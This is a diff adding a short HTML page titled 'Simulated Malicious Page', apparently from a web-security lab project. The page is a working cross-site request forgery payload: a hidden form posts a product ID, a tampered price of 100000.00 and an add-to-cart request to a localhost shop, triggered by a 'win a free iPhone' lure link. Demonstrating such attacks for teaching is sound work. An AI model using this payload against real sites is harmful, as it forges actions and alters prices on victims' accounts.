@@ -1,0 +1,17 @@
+<html>
+<body>
+
+<h1>Simulated Malicious Page</h1>
+<script>
+    function submitForm() {
+        document.forms[0].submit();
+    }
+</script>
+<form action="http://localhost/webSecurityProject/index.php" method="POST" style="display: none;">
+    <input type="hidden" name="product_id" value="2">
+    <input type="hidden" name="product_price" value="100000.00">
+    <input type="hidden" name="add_to_cart">
+</form>
+<a href="#" onclick="submitForm()">Click here to win a free iPhone!</a>
+</body>
+</html>
